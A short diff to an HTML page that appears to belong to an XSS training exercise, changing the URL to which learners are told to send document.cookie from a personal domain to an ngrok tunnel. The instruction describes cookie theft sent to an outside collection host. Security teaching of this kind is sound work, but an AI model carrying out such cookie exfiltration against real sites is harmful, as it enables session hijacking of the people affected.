@@ -45,7 +45,7 @@
 
     <ul>
         <li>Send the value of document.cookie to GET
-            https://server.kevincunningham.co.uk/xss/two?cookie=COOKIE_PAYLOAD&name=YOUR_NAME.
+            https://3e36-51-52-158-78.ngrok-free.app/xss/two?cookie=COOKIE_PAYLOAD&name=YOUR_NAME.
         </li>
     </ul>
 
